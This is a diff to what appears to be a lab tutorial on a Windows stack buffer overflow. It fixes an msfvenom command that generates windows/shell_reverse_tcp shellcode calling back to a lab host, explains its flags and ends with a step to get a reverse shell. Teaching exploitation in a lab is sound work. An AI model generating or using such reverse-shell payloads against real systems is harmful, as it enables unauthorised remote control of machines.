@@ -327,7 +327,7 @@ We will need to setup the stack such that it has the following signature. *Note*
 5. Now we can add a payload to our exploit, this can be generated with [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html). 
 
 	```
-	$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=thread -f python -v SHELL -b '\x00x\0a\x0d'
+	$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=thread -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d'
 	```
 	* `-p `: Payload we are generating shellcode for.
     	* `windows/shell_reverse_tcp`: Reverse TCP payload for Windows.
@@ -338,8 +338,10 @@ We will need to setup the stack such that it has the following signature. *Note*
     	* `python`: Format for use in python scripts.
   	* `-v`: Specify a custom variable name.
     	* `SHELL`: Shell Variable name.
+  	* `-a x86`: Specify the target architecture as `x86`
+	* `--platform windows`: Specify the target platform as Windows
   	* `-b`: Specifies bad chars and byte values. This is given in the byte values. 
-      	* `\x00x\0a\x0d`: Null char, carriage return, and newline. 
+      	* `\x00\x0a\x0d`: Null char, carriage return, and newline. 
 
 6. Now we can modify the exploit program to reflect [exploit2.py](./SourceCode/exploit2.py) and verify that we can acquire a reverse shell!  
 
